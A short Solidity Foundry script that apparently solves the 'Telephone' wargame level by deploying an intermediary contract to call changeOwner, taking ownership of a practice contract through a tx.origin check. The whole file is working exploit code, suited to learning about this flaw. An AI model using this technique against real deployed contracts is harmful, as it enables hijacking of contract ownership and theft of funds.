// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract ExploitTelephone is Script {
    address private constant INSTANCE_ADDRESS = 0xfFe7a62a9077F32Bd087E0693F936fb8A869F7ff;
    uint256 private PRIVATE_KEY = vm.envUint("PRIVATE_KEY");

    function run() external {
        vm.startBroadcast();
        CallTelephone callTelephone = new CallTelephone();
        callTelephone.callChangeOwner();
        vm.stopBroadcast();
    }
}

contract CallTelephone {
    address private constant INSTANCE_ADDRESS = 0xfFe7a62a9077F32Bd087E0693F936fb8A869F7ff;
    address private constant PLAYER_ADDRESS = 0xe281A8F9a6180f1cF40Af4E5Fd8Ed39060e3a867;

    function callChangeOwner() external {
        Telephone(INSTANCE_ADDRESS).changeOwner(PLAYER_ADDRESS);
    }
}
